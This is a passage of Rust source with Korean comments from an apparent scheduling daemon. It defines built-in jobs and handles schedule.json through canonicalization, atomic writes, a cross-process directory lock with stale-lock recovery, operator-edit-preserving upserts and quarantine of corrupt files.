        // 스폰 0). 대기형 안의 스왑 직전 상위집합 검사(DCE-3)가 스텁 템플릿 승격을 보류한다.
        // base_only+fire() 관문: 부서 데몬에 복제 기록된 이 잡이 돌면 게이트 파일이 $HOME
        // 절대경로라 부서에서도 성공해 base 와 동시 승격 시도(단일소유 위반)가 되므로 base
        // 레인에서만 발화한다(R3-P03-3 — cys-dept 비경유 재기동은 seed_schedule 청소가 안 돈다).
        json!({
            "id": "ceo-promote-pending-tick",
            "every_minutes": 10,
            "action": "command",
            "base_only": true,
            "command": "pk=\"${CYS_PACK_DIR:-$HOME/.cys/pack}\"; [ -x \"$pk/bin/cys-dept\" ] || exit 0; env -u CYS_ROLE -u CYS_SURFACE_ID -u CYS_SURFACE_REF -u CYS_SEAT_TOKEN -u CYS_DEPT_ROTATE \"$pk/bin/cys-dept\" promote-if-pending",
            "_builtin": "promote",
            "_builtin_version": BUILTIN_JOBS_VERSION
        }),
        // ── ★(0.14.31 · WP-3 B) CSO alert inbox 정기 점검(60분) ────────────────────────
        // **신규 id 라 BUILTIN_JOBS_VERSION 범프 불요·금지**(R3-P03-3 선례와 동일: 범프하면
        // 기존 builtin 전체가 코드 정의로 통째 교체돼 운영자 수기 편집이 무언 소실된다).
        // ★`via_queue: true` — 이 잡만 큐를 경유한다. 스케줄 push 는 원래 `fire_push`→`inject`
        //   로 큐를 **우회**하는데(§8 명시), CSO 앞 정기 점검이 그 경로를 타면 초안·alt-screen·
        //   승인대기·빈 좌석·pause 게이트를 전부 건너뛰고 좌석에 글자를 꽂는다. 큐 경유면
        //   배달자(watchdog 틱)가 그 게이트를 전부 통과시킨 뒤에야 주입한다.
        // ★`base_only` 를 세우지 않는다(=false): 부서 데몬은 **자기 CSO 좌석과 자기 alert_route
        //   상태**를 가진다 — base 전용으로 만들면 부서 CSO 는 자기 데몬의 경보를 정기적으로
        //   훑을 계기를 영영 못 받는다. 이 잡은 조직 전역 1건이 아니라 **데몬 지역 점검**이다.
        // ★`if_absent: "skip"` — CSO 좌석이 없으면 조용히 건너뛴다(부재는 에러가 아니다 ·
        //   좌석 없는 데몬에서 schedule.error 를 매 시간 쌓지 않는다).
        // ★문안에 선두 라벨을 두지 않는다 — `ensure_machine_label` 이 `[schedule <id>]` 을
        //   붙인다(기계 유래 표식의 단일 규약. 여기서 `[alert]` 를 흉내내면 데몬 경보와 스케줄
        //   발화가 판독자에게 같은 것으로 보인다).
        // ★무이상 카운터 갱신은 잡이 하지 않는다(정본 §4 B) — 파일 동시성 회피.
        json!({
            "id": "cso-alert-inbox-check-60m",
            "every_minutes": 60,
            "action": ACTION_PUSH_QUEUED,
            "to": "cso",
            "if_absent": "skip",
            "via_queue": true,
            "text": "데몬 alert inbox 정기 점검(60분). 큐에 쌓인 [alert] 항목을 순서대로 읽고 좌석 건강·자원 게이트·컨텍스트 사이클 범위에서만 판단하라. 경보는 데몬이 밀어 넣는다 — 직접 구독(Monitor)·크론 재등록은 하지 마라. 이상이 없으면 아무것도 기록하지 마라(무이상 무기록).",
            "_builtin": "alert",
            "_builtin_version": BUILTIN_JOBS_VERSION
        }),
    ]
}

/// 저장된 잡 배열에서 `action:"push" + via_queue:true` 를 `action:"push_queued"` 로 접는다(순수).
/// 반환: 바꾼 것이 있는가. **`push` 이외의 action 은 건드리지 않는다**(운영자 편집 보존 · §B-5).
fn canonicalize_stored_queue_actions(jobs: &mut [serde_json::Value]) -> bool {
    let mut changed = false;
    for j in jobs.iter_mut() {
        let is_push = j.get("action").and_then(|v| v.as_str()) == Some("push");
        let via = j.get("via_queue").and_then(|v| v.as_bool()).unwrap_or(false);
        if is_push && via {
            if let Some(o) = j.as_object_mut() {
                o.insert("action".into(), json!(ACTION_PUSH_QUEUED));
            }
            changed = true;
        }
    }
    changed
}

/// ★(0.14.31 · 수렴 R2 · triage X8 잔여) **파일을 정규형으로 접고 그 사실을 남긴다.**
///
/// 정규화가 데몬 부트(`ensure_builtin_jobs`)에서만 돌면 그 뒤의 운영자 수기 편집은 **파일에
/// 강등 취약형으로 남는다**: `load_jobs` 의 핫리로드는 메모리 안에서만 접고, `remove_job_from_file`
/// 은 그 원시 JSON 을 **그대로 다시 쓴다**. 신 데몬이 도는 동안 손으로 넣은
/// `action:"push" + via_queue:true` 가 그렇게 디스크에 살아남아, 강등된 구 데몬이 그것을 `push`
/// 로 읽고 **큐 준비 게이트를 통째 우회해 직접 주입**한다(이 정규화의 목적 그 자체).
///
/// 그래서 **원시 JSON 을 쓰는 모든 자리**가 이 함수를 지난다. 뜻은 보존한다(같은 잡·같은 목적지·
/// 같은 문안 · action 표현만 하나로) — §B-5 의 "무언 소실" 이 아니지만, 조용한 무접촉도 관측
/// 소실이므로 바꾼 잡 id 를 한 줄로 남긴다.
/// 반환: 파일을 바꿨는가.
fn canonicalize_schedule_file(path: &std::path::Path, root: &mut serde_json::Value) -> bool {
    let ids: Vec<String> = match root.get_mut("jobs").and_then(|j| j.as_array_mut()) {
        Some(arr) => {
            if !canonicalize_stored_queue_actions(arr) {
                return false;
            }
            arr.iter()
                .filter(|j| j.get("action").and_then(|v| v.as_str()) == Some(ACTION_PUSH_QUEUED))
                .filter_map(|j| j.get("id").and_then(|v| v.as_str()).map(str::to_string))
                .collect()
        }
        None => return false,
    };
    if !write_schedule_atomic(path, root) {
        eprintln!("[cysd] schedule.json 정규화 기록 실패 — 파일은 구 표현 그대로다(강등 시 직접 주입 위험)");
        return false;
    }
    eprintln!(
        "[cysd] schedule.json: 'action:\"push\" + via_queue:true' 를 '{ACTION_PUSH_QUEUED}' 로 접었다(뜻 보존 · 대상 {ids:?})"
    );
    true
}

/// schedule.json 원자 치환(tmp+rename) — 핫리로드 torn read 회피. 반환: 성공했는가.
///
/// ★(성찰 A11) tmp 이름은 **pid + nonce** 다. 종전의 고정 `schedule.json.tmp` 는 데몬의 세
/// writer(`ensure_builtin_jobs` · 틱 핫리로드 정규화 · `remove_job_from_file`)와 CLI
/// (`cys schedule add/rm`)가 **같은 이름**을 나눠 써, A 의 `rename` 이 B 가 반쯤 쓴 파일을
/// `schedule.json` 자리에 놓을 수 있었다(부분 JSON → 손상 격리 → 빈 스케줄 → 전 builtin 침묵).
/// 이름 분리는 torn 파일을 막고, **쓰기 순서**는 [`ScheduleFileLock`] 이 직렬화한다.
fn write_schedule_atomic(path: &std::path::Path, root: &serde_json::Value) -> bool {
    let Ok(body) = serde_json::to_string_pretty(root) else {
        return false;
    };
    let tmp = schedule_tmp_path(path);
    if std::fs::write(&tmp, body).is_err() {
        let _ = std::fs::remove_file(&tmp);
        return false;
    }
    if std::fs::rename(&tmp, path).is_err() {
        let _ = std::fs::remove_file(&tmp);
        return false;
    }
    true
}

/// writer 별로 다른 임시 파일 — `schedule.json.<pid>.<nonce>.tmp`(같은 디렉터리 = 같은 볼륨 → rename 원자).
fn schedule_tmp_path(path: &std::path::Path) -> PathBuf {
    static NONCE: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
    let n = NONCE.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    let name = path
        .file_name()
        .map(|f| f.to_string_lossy().into_owned())
        .unwrap_or_else(|| "schedule.json".into());
    path.with_file_name(format!("{name}.{}.{n}.tmp", std::process::id()))
}

/// ★(성찰 A11) **schedule.json writer 잠금** — 디렉터리 잠금(`schedule.json.lock` 을 `create_dir`).
///
/// `create_dir` 은 POSIX·NTFS 모두에서 "있으면 실패" 가 **원자**라 Windows 에서 flock 없이
/// 되는 유일한 상호배제 원시다(Git Bash `sh` · ConPTY 환경 포함). 보유자가 죽어 잠금이 남으면
/// mtime 이 [`SCHEDULE_LOCK_STALE_SECS`] 를 넘긴 잠금을 **깨고** 진입한다(pid 검사는 Windows 에서
/// 신뢰할 수 없어 쓰지 않는다). 대기는 [`SCHEDULE_LOCK_WAIT_MS`] 로 유계 — 못 잡으면 `None` 이고
/// 호출부는 **이번 쓰기를 포기**한다(다음 틱이 다시 온다 · 잠금 없이 쓰는 경로는 없다).
///
/// 같은 프로토콜을 CLI(`cys.rs` 의 `schedule add/rm` 저장 — cli-boot C10)가 쓴다: 잠금 =
/// `<schedule.json>.lock` 디렉터리 · 획득 = `create_dir` · 대기 ≤ [`SCHEDULE_LOCK_WAIT_MS`](10ms 간격) ·
/// mtime [`SCHEDULE_LOCK_STALE_SECS`] 초과 잠금은 깨도 된다 · tmp = `<schedule.json>.<pid>.<nonce>.tmp`
/// + rename · 해제 = `remove_dir`.
///
/// ★(통합 2026-09-10) 두 레인(A11 데몬 · C10 CLI)이 이 잠금을 **각자** 착지시켰고 값이 갈려
/// 있었다(데몬 2,000ms/30s · CLI 3,000ms/60s). 부패 문턱이 갈리면 상호 배제가 무너진다 —
/// 데몬이 30s 를 넘긴 **살아 있는** CLI 잠금을 깨고 같은 파일에 동시 진입한다(완료된
/// `cys schedule add` 가 다시 사라지는 A11·C10 의 원래 사고 형상 그대로). 통일 방향은 **큰
/// 쪽**이다: 문턱이 작으면 산 잠금을 깨고(정확성 손실), 크면 죽은 잠금 회수만 늦다(가용성 ·
/// 데몬은 다음 틱이 있고 CLI 는 사람에게 사유를 낸다). 소스 대조 핀:
/// `c10_cli_schedule_saves_go_through_the_canonicalizing_locked_atomic_transaction`.
///
/// **읽기는 잠그지 않는다**(CQS). 읽기가 보는 것은 언제나 rename 전이거나 후인 온전한 문서다.
pub struct ScheduleFileLock {
    dir: PathBuf,
}

/// 잠금 대기 상한(ms). 데몬 틱·CLI 의 쓰기는 수 ms 라 이 안에 언제나 풀린다.
/// **CLI `cys.rs::SCHEDULE_LOCK_WAIT_MS` 와 같은 값이어야 한다**(위 doc 참조).
pub const SCHEDULE_LOCK_WAIT_MS: u64 = 3_000;
/// 이보다 오래된 잠금은 죽은 보유자의 것이다(깨도 된다).
/// **CLI `cys.rs::SCHEDULE_LOCK_STALE_SECS` 와 같은 값이어야 한다** — 갈리면 상호 배제가 무너진다.
pub const SCHEDULE_LOCK_STALE_SECS: u64 = 60;

impl ScheduleFileLock {
    pub fn lock_dir_for(path: &std::path::Path) -> PathBuf {
        let name = path
            .file_name()
            .map(|f| f.to_string_lossy().into_owned())
            .unwrap_or_else(|| "schedule.json".into());
        path.with_file_name(format!("{name}.lock"))
    }

    /// 프로덕션 진입점 — 기본 대기·부패 상한.
    pub fn acquire(path: &std::path::Path) -> Option<Self> {
        Self::acquire_with(
            path,
            Duration::from_millis(SCHEDULE_LOCK_WAIT_MS),
            Duration::from_secs(SCHEDULE_LOCK_STALE_SECS),
        )
    }

    /// 대기·부패 상한을 주입받는 본체(검체가 부패 잠금 깨기를 초 단위로 기다리지 않게).
    pub fn acquire_with(path: &std::path::Path, wait: Duration, stale: Duration) -> Option<Self> {
        let dir = Self::lock_dir_for(path);
        if let Some(parent) = dir.parent() {
            let _ = std::fs::create_dir_all(parent);
        }
        let deadline = std::time::Instant::now() + wait;
        loop {
            match std::fs::create_dir(&dir) {
                Ok(()) => return Some(Self { dir }),
                Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => {
                    // 죽은 보유자의 잠금인가 — mtime 이 부패 상한을 넘겼으면 깨고 다시 잡는다.
                    let stale_now = std::fs::metadata(&dir)
                        .and_then(|m| m.modified())
                        .ok()
                        .and_then(|t| t.elapsed().ok())
                        .is_some_and(|age| age > stale);
                    if stale_now {
                        // ★(0.14.31 · 성찰 확인 · blocking) **회수는 CLI 와 같은 철자여야 한다.**
                        //   CLI(`cys.rs::acquire_schedule_lock`)는 잠금 디렉터리 **안**에 owner 파일을
                        //   쓴다. 그 창에서 writer 가 SIGKILL 되면 잔존 잠금은 **비어 있지 않다** —
                        //   종전의 `remove_dir` 는 ENOTEMPTY(실측 errno 66)로 실패하고 mtime 은 그대로라
                        //   `stale_now` 가 계속 참이다. 두 writer 의 비대칭이 그 자체로 부트체인 사고였다.
                        let _ = std::fs::remove_dir_all(&dir);
                    }
                    // ★회수 실패도 **유계**여야 한다 — 종전엔 여기서 `continue` 로 돌아 아래의
                    //   deadline 검사와 10ms sleep 을 **둘 다 건너뛰었다**. remove 가 지속 실패하면
                    //   (Windows: 인덱서·백신이 디렉터리를 열고 있으면 sharing violation) 루프가
                    //   영원히 돌고 함수는 절대 반환하지 않는다 — 이 함수는
                    //   `ensure_builtin_jobs()`(main.rs)가 accept 루프 **이전**에 동기로 부르므로
                    //   데몬이 소켓을 한 번도 받지 못한다(부트체인 전손 · 자가 회복 경로 없음).
                    //   유계 대기 뒤 `None` = 쓰기 포기(막는 방향).
                }
                Err(_) => return None, // 잠금 디렉터리를 만들 수 없는 파일시스템 — 쓰기 포기(막는 방향)
            }
            if std::time::Instant::now() >= deadline {
                return None;
            }
            std::thread::sleep(Duration::from_millis(10));
        }
    }
}

impl Drop for ScheduleFileLock {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir(&self.dir);
    }
}

/// built-in 잡을 jobs 배열에 idempotent upsert(순수 — 회귀 핀). id 로 대조:
///   · 부재 → append(생성)
///   · 존재 + built-in 마커(`_builtin`이 코드 정의와 일치: "phoenix"·"learn"·"cycle"·"formation"·"promote") → 버전 상이 시 교체(갱신)·동버전 무접촉
///   · 존재 + **마커 없음/불일치(사용자가 그 id 선점)** → ★codex W3: 교체 금지(사용자 잡 보존)·경고(conflicts 반환)
/// 반환 `(changed, preempted, edited_action)` — ★(0.14.31 · 수렴 R2 · triage X13) **덮지 않은
/// 두 사유를 가른다**. 종전에는 둘이 한 벡터라 호출부가 양쪽에 "예약 id 선점" 문안을 찍었다:
/// action 만 편집한 운영자는 일어나지도 않은 선점을 통보받고 틀린 처방(다른 id 로 옮기라)을
/// 읽었다 — 같은 실행에서 정확한 줄과 함께 나오므로 **서로 모순되는 두 줄**이었다.
///   · `preempted` = 사용자 잡이 예약 id 를 선점(마커 없음/불일치) → 처방: 다른 id 로 옮기라.
///   · `edited_action` = 우리 잡인데 운영자가 action 을 편집(id, 현재 action) → 처방: action 을 되돌리라.
fn apply_builtin_jobs(
    jobs: &mut Vec<serde_json::Value>,
) -> (bool, Vec<String>, Vec<(String, String)>) {
    let mut changed = false;
    let mut conflicts = Vec::new();
    let mut edited_action: Vec<(String, String)> = Vec::new();
    for bj in builtin_jobs() {
        let id = match bj.get("id").and_then(|v| v.as_str()) {
            Some(s) => s.to_string(),
            None => continue,
        };
        let want_ver = bj.get("_builtin_version").and_then(|v| v.as_u64()).unwrap_or(0);
        match jobs
            .iter()
            .position(|j| j.get("id").and_then(|v| v.as_str()) == Some(id.as_str()))
        {
            Some(pos) => {
                // ★codex W3 major: built-in 마커(_builtin)가 코드 정의(bj)의 마커와 일치하는 항목만
                //   우리 소유 → 버전 갱신. 마커 없는/다른 동명 항목은 사용자가 그 id 를 선점한 것
                //   → 교체 금지+conflict 경고(user 잡 보존). (마커군: "phoenix"=인프라·"learn"=학습 루프·"cycle"=전자동 사이클)
                let want_marker = bj.get("_builtin").and_then(|v| v.as_str());
                let is_ours = want_marker.is_some()
                    && jobs[pos].get("_builtin").and_then(|v| v.as_str()) == want_marker;
                if !is_ours {
                    conflicts.push(id);
                    continue;
                }
                // ★(0.14.31 · 리뷰 R1 · codex blocking) **표적 마이그레이션: action 만 고친다.**
                //   동버전 항목은 아래에서 무접촉인데, 우리 잡의 `action` 이 코드 정의와 달라진
                //   경우(구 빌드가 `push` 로 심어 둔 그 잡)는 그대로 두면 **큐 우회 주입**이
                //   남는다. 전역 버전 범프는 다른 builtin 전부를 코드 정의로 덮어 운영자 편집을
                //   소실시키므로(§B-5 금지), 같은 id·같은 마커 항목의 **그 필드만** 고친다.
                //   `via_queue` 도 함께 세워, 운영자가 action 을 되돌려도 신 데몬은 큐를 탄다.
                //   ★(0.14.31 · 독립 판정 triage X13) 조건은 "**구 표현인가**" 이지 "코드 정의와
                //   다른가" 가 아니다. 종전 조건은 같은 id·같은 마커를 유지한 채 `action` 을
                //   `command` 로 바꾼 운영자 잡까지 `push_queued` 로 덮었다 — 설정한 명령이 돌지
                //   않고 그 문자열이 inbox 잡이 된다(§B-5 "운영자 수기 편집 무언 소실 금지" 위반).
                //   이관 대상은 구 빌드가 심은 정확히 그 표현(`"push"`)뿐이고, 그 밖의 불일치는
                //   **덮지 않고 conflict 로 보고**한다.
                if let Some(want_action) = bj.get("action").and_then(|v| v.as_str()) {
                    let cur_action = jobs[pos].get("action").and_then(|v| v.as_str());
                    if want_action == ACTION_PUSH_QUEUED && cur_action != Some(want_action) {
                        if cur_action == Some("push") {
                            if let Some(o) = jobs[pos].as_object_mut() {
                                o.insert("action".into(), serde_json::json!(want_action));
                                o.insert("via_queue".into(), serde_json::json!(true));
                            }
                            changed = true;
                            eprintln!(
                                "[cysd] ensure_builtin_jobs: '{id}' 의 action 을 '{want_action}' 로 이관 — 큐 경유가 이 잡의 계약이다(직접 주입 차단)"
                            );
                        } else {
                            // ★(triage X13 · 수렴 R2) 이것은 **id 선점이 아니다** — 우리 잡인데
                            //   운영자가 action 을 고쳤다. 사유를 갈라 담아야 호출부가 맞는
                            //   처방을 찍는다(선점 문안은 여기서 틀린 안내가 된다).
                            edited_action
                                .push((id.clone(), cur_action.unwrap_or("(없음)").to_string()));
                            eprintln!(
                                "[cysd] ensure_builtin_jobs: '{id}' 의 action 이 '{}' 로 편집돼 있다 — 이관하지 않는다(운영자 편집 보존). 큐 경유가 필요하면 action 을 '{want_action}' 로 두라.",
                                cur_action.unwrap_or("(없음)")
                            );
                        }
                    }
                }
                // ★(통합 2026-09-10 · P3·P8) **표적 command 이관** — 구 표현과 바이트 동일할
                //   때만 코드 정의로 올린다(위 action 이관과 같은 규율). 동버전 무접촉 계약을
                //   지키면서 기존 설치본에 두 수정을 실제로 닿게 하는 유일한 경로다.
                if let (Some(want_cmd), Some(cur_cmd)) = (
                    bj.get("command").and_then(|v| v.as_str()),
                    jobs[pos].get("command").and_then(|v| v.as_str()),
                ) {
                    let known_bad = if cur_cmd != want_cmd {
                        BUILTIN_COMMAND_MIGRATIONS
                            .iter()
                            .find(|(mid, old, _)| *mid == id.as_str() && *old == cur_cmd)
                            .map(|(_, _, why)| *why)
                    } else {
                        None
                    };
                    if let Some(why) = known_bad {
                        let want_cmd = want_cmd.to_string();
                        if let Some(o) = jobs[pos].as_object_mut() {
                            o.insert("command".into(), serde_json::json!(want_cmd));
                        }
                        changed = true;
                        // ★(성찰 2회) 사유는 **맞은 항목의 것**만 찍는다 — 종전엔 P3·P8 을 고정 나열해
                        //   WP6-5 이관에도 남의 사유가 찍혔다(로그를 읽는 사람이 엉뚱한 결함을 찾는다).
                        eprintln!(
                            "[cysd] ensure_builtin_jobs: '{id}' 의 command 를 구 표현에서 이관 — 그 표현은 알려진 결함이다({why})"
                        );
                    }
                }
                let cur_ver = jobs[pos].get("_builtin_version").and_then(|v| v.as_u64());
                if cur_ver != Some(want_ver) {
                    // [가청화 · 2026-08-20] 버전 교체는 기존 항목을 코드 정의로 **통째** 덮는다 —
                    // 운영자가 command/every_minutes 등을 손으로 고쳐 둔 경우 그 편집이 무언
                    // 소실되는 지점이다(파일 채널(STATE_DIR/mode) 밖의 잡 문자열 편집은 여기서
                    // 살아남지 못한다 — builtin_jobs() 상단 B3 주석과 같은 기제). 로직은 불변
                    // (교체는 그대로) — 소실 사실만 경고 1줄로 가청화한다. 버전 필드 차이는
                    // 갱신의 정의 자체라 비교에서 제외한다.
                    let strip = |v: &serde_json::Value| {
                        let mut c = v.clone();
                        if let Some(o) = c.as_object_mut() {
                            o.remove("_builtin_version");
                        }
                        c
                    };
                    if strip(&jobs[pos]) != strip(&bj) {
                        eprintln!(
                            "[cysd] ensure_builtin_jobs: built-in 잡 '{id}' 버전 교체 — 기존 항목이 코드 정의와 달라 그 편집이 소실됩니다(구 항목: {})",
                            jobs[pos]
                        );
                    }
                    jobs[pos] = bj; // built-in 구버전 → 갱신
                    changed = true;
                }
                // 존재+동버전 = 무접촉(중복 생성 0)
            }
            None => {
                jobs.push(bj); // 부재 → 생성
                changed = true;
            }
        }
    }
    (changed, conflicts, edited_action)
}

/// ★B2-1(W3): 데몬 부트 시 built-in phoenix 잡을 schedule.json 에 idempotent 하게 보장한다. schedule.json 은
/// user-owned(사용자 `cys schedule add` 잡 보존)이라 팩 배달로는 built-in 잡을 갱신할 수 없다 — 코드가 upsert 한다.
/// 파일 부재=빈 골격 생성 · 손상(파싱 실패)=무접촉(load_jobs 의 격리 경로가 별도 처리 — 여기서 덮어써 사용자 잡을
/// 잃지 않는다) · 변경 있을 때만 원자적 재기록(핫 리로드 torn read 회피).
pub fn ensure_builtin_jobs() {
    ensure_builtin_jobs_at(&schedule_path());
}

/// 경로 주입판(검체 가능) — 위 함수의 본체. ★(성찰 A11) **writer 잠금** 아래에서 읽고·접고·쓴다.
pub fn ensure_builtin_jobs_at(path: &std::path::Path) {
    let Some(_lock) = ScheduleFileLock::acquire(path) else {
        eprintln!("[cysd] ensure_builtin_jobs: schedule.json writer 잠금을 {SCHEDULE_LOCK_WAIT_MS}ms 안에 잡지 못했다 — 무접촉(다음 기회에 다시)");
        return;
    };
    ensure_builtin_jobs_locked(path);
}

/// 잠금을 **이미 쥔** 호출자용 본체(손상 격리 직후 같은 틱의 복구가 여기로 온다).
fn ensure_builtin_jobs_locked(path: &std::path::Path) {
    let mut root: serde_json::Value = match std::fs::read_to_string(path) {
        Ok(c) => match serde_json::from_str(&c) {
            Ok(v) => v,
            Err(e) => {
                // 손상 — 무접촉(사용자 잡 보존 우선). load_jobs 가 격리+loud 신호를 낸다.
                eprintln!("[cysd] ensure_builtin_jobs: schedule.json 파싱 실패({e}) — 무접촉(손상은 load_jobs 격리 소관)");
                return;
            }
        },
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => json!({"jobs": []}),
        Err(e) => {
            eprintln!("[cysd] ensure_builtin_jobs: schedule.json 읽기 실패({e}) — 무접촉");
            return;
        }
    };
    if !root.is_object() {
        eprintln!("[cysd] ensure_builtin_jobs: schedule.json 최상위가 object 아님 — 무접촉");
        return;
    }
    // jobs 배열 확보(부재/비배열이면 빈 배열로 정규화 — 다른 키는 보존).
    if !root.get("jobs").map(|j| j.is_array()).unwrap_or(false) {
        root.as_object_mut()
            .unwrap()
            .insert("jobs".to_string(), json!([]));
    }
    let arr = root.get_mut("jobs").and_then(|j| j.as_array_mut()).unwrap();
    // ★(triage X8) 저장된 표현도 같은 정규형으로 접는다 — 메모리에서만 접으면 **파일**은 여전히
    //   `action:"push"` 라 강등된 구 데몬이 그것을 직접 주입한다(이 정규화의 목적 그 자체).
    let normalized = canonicalize_stored_queue_actions(arr);
    if normalized {
        // ★(triage X8 minor · 수렴 R2) 조용한 파일 수정은 관측 소실이다 — 무엇을 접었는지 남긴다.
        eprintln!(
            "[cysd] ensure_builtin_jobs: 저장된 'action:\"push\" + via_queue:true' 를 '{ACTION_PUSH_QUEUED}' 로 접었다(뜻 보존 · 강등된 구 데몬이 직접 주입하지 못하게)"
        );
    }
    let (bchanged, preempted, edited_action) = apply_builtin_jobs(arr);
    let changed = normalized || bchanged;
    for id in &preempted {
        eprintln!(
            "[cysd] ensure_builtin_jobs: 사용자 잡이 예약 id '{id}' 를 선점 — built-in 갱신 skip(사용자 잡 보존). \
             built-in 기능을 원하면 사용자 잡을 다른 id 로 옮기라."
        );
    }
    for (id, cur) in &edited_action {
        // ★(triage X13 · 수렴 R2) 선점이 아니다 — id 는 우리 것이고 운영자가 action 만 고쳤다.
        eprintln!(
            "[cysd] ensure_builtin_jobs: built-in 잡 '{id}' 의 action 이 '{cur}' 로 편집돼 있다 — 덮지 않는다(운영자 편집 보존). \
             이 잡의 큐 경유가 필요하면 action 을 '{ACTION_PUSH_QUEUED}' 로 되돌리라(id 는 그대로 두라)."
        );
    }
    if changed {
        if write_schedule_atomic(path, &root) {
            eprintln!("[cysd] ensure_builtin_jobs: built-in phoenix 잡 보장(생성/갱신) 완료");
        } else {
            eprintln!("[cysd] ensure_builtin_jobs: schedule.json 원자쓰기 실패");
        }
    }
}

fn state_path(daemon: &Daemon) -> PathBuf {
    state_dir(&daemon.socket_path).join("schedule_state.json")
}

/// 손상 영속 파일 격리 — 조용히 기본값으로 덮어쓰지 않고 `<name>.corrupt-<epoch>`로 옮긴다.
/// 데이터 보존 + 복원 가능 + loud 신호(호출부 eprintln). rename 성공 시 백업 경로를 반환한다.
/// 부재 파일(첫 가동)은 정상이므로 격리 대상이 아니다 — 호출부가 NotFound를 먼저 분기한다.
fn quarantine_corrupt(path: &std::path::Path) -> Option<PathBuf> {
    let name = path
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_default();
    let backup = path.with_file_name(format!("{name}.corrupt-{}", now_epoch() as u64));
    std::fs::rename(path, &backup).ok().map(|_| backup)
}

/// ★(성찰 A11) **읽기 전용 로더**(CQS). `schedule.status`(`cys schedule list`)·`run_now` 가 쓴다 —
/// 조회 RPC 는 디스크를 바꾸지 않는다. 손상도 **격리하지 않는다**(rename 은 쓰기다): loud 신호만
/// 남기고 빈 스케줄을 돌려주며, 격리·복구는 30초 안에 오는 스케줄러 틱([`load_jobs_hot_reload`])의
/// 소관이다. 메모리의 `Job` 은 serde 계층이 그대로 정규화하므로 뜻은 같다.
pub fn load_jobs() -> Vec<Job> {
    load_jobs_at(&schedule_path(), LoadMode::ReadOnly)
}

/// ★(성찰 A11) 스케줄러 틱 전용 **단일 writer 로더** — writer 잠금 아래에서 (a) 손상이면 격리하고
/// **같은 틱에** builtin 을 복구하며 (b) 저장 표현을 정규형으로 접어 되쓴다(triage X8).
/// 종전에는 `load_jobs()` 하나가 `status`·`run_now`·틱에서 전부 파일을 되썼다 — 잠금 없는 병렬
/// writer 3개(`main.rs` 의 `spawn_blocking` 이 RPC 를 진짜 병렬로 만든다) + CLI 1개.
pub fn load_jobs_hot_reload() -> Vec<Job> {
    load_jobs_at(&schedule_path(), LoadMode::HotReload)
}

/// 로더의 두 모드 — **읽기**와 **쓰기 겸 읽기**를 자료형으로 가른다.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum LoadMode {
    /// 파일을 바꾸지 않는다(격리도 정규화도 없음). 잠금을 잡지 않는다.
    ReadOnly,
    /// writer 잠금 아래에서 격리 + 같은 틱 builtin 복구 + 정규형 되쓰기.
    HotReload,
}

/// 경로 주입판(검체 가능) — 두 로더의 본체.
pub fn load_jobs_at(path: &std::path::Path, mode: LoadMode) -> Vec<Job> {
    // 쓰기 모드는 읽기 **전에** 잠근다 — 읽기와 치환 사이에 CLI 추가가 끼어들면 그 추가가
    // 우리의 옛 문서로 덮여 사라진다(CLI 는 이미 성공을 출력한 뒤 = 거짓 성공).
    let lock = match mode {
        LoadMode::ReadOnly => None,
        LoadMode::HotReload => match ScheduleFileLock::acquire(path) {
            Some(l) => Some(l),
            None => {
                // 잠금을 못 잡았다 — 이번 틱은 **읽기만** 한다(쓰기 없는 경로로 강등 · 발화는 계속).
                eprintln!("[cysd] schedule: writer 잠금을 {SCHEDULE_LOCK_WAIT_MS}ms 안에 잡지 못했다 — 이번 틱은 읽기만 한다");
                return load_jobs_at(path, LoadMode::ReadOnly);
            }
        },
    };
    let content = match std::fs::read_to_string(path) {
        Ok(c) => c,
        // 부재 = 정상(스케줄 미설정). 빈 스케줄로 조용히 진행한다.
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Vec::new(),
        Err(e) => {
            eprintln!(
                "[cysd] schedule.json 읽기 실패({}): {e} — 빈 스케줄로 진행",
                path.display()
            );
            return Vec::new();
        }
    };
    // 존재하나 파싱 불가 = 데이터 손상. 조용히 빈 스케줄로 대체하면 24/365 데몬의 전 하트비트가
    // 신호 0으로 소실된다(헌장 복원 불변식 모순). 손상본을 격리하고 loud 신호를 남긴다.
    let mut root: serde_json::Value = match serde_json::from_str(&content) {
        Ok(v) => v,
        Err(e) => {
            if lock.is_none() {
                // 읽기 전용 경로는 격리하지 않는다(rename 은 쓰기다) — 틱이 30초 안에 처리한다.
                eprintln!("[cysd] schedule.json 파싱 실패: {e} — 읽기 전용 경로라 격리하지 않는다(다음 틱이 격리·복구) · 빈 스케줄로 진행");
                return Vec::new();
            }
            let note = match quarantine_corrupt(path) {
                Some(b) => format!("손상본을 {}로 격리(데이터 보존)", b.display()),
                None => "손상본 격리 실패".to_string(),
            };
            // ★(성찰 A11 ⓒ) 격리 뒤 **같은 틱에서** builtin 을 복구한다. 종전에는 `ensure_builtin_jobs`
            //   가 부트에만 돌아 phoenix 스냅샷·learn 감사·cycle 틱·편성 심박·CSO 60분 점검이
            //   **데몬 재시작까지 전부 정지**했다(코드 자신이 경고한 무발화 침묵).
            eprintln!("[cysd] schedule.json 파싱 실패: {e} — {note}; 같은 틱에서 built-in 잡을 복구한다");
            ensure_builtin_jobs_locked(path);
            return match std::fs::read_to_string(path)
                .ok()
                .and_then(|c| serde_json::from_str::<serde_json::Value>(&c).ok())
            {
                Some(v) => jobs_of(&v),
                None => Vec::new(),
            };
        }
    };
    // ★(수렴 R2 · triage X8 잔여) **핫리로드도 파일을 접는다.** 종전에는 아래 serde 계층이
    //   메모리의 `Job` 만 정규화했고(`canonicalize_queue_action`), 디스크는 운영자가 손으로 넣은
    //   구 표현 그대로였다 — 그 표현이 강등된 구 데몬의 직접 주입 통로다. 멱등이라 바뀔 것이
    //   없으면 파일을 건드리지 않는다(매 틱 쓰기 없음). ★(성찰 A11) 쓰기 모드에서만 · 잠금 아래에서.
    if lock.is_some() {
        canonicalize_schedule_file(path, &mut root);
    }
    jobs_of(&root)
}

/// 최상위 문서 → `Vec<Job>`(스키마 불일치는 loud + 빈 스케줄).
fn jobs_of(root: &serde_json::Value) -> Vec<Job> {
    match root.get("jobs") {
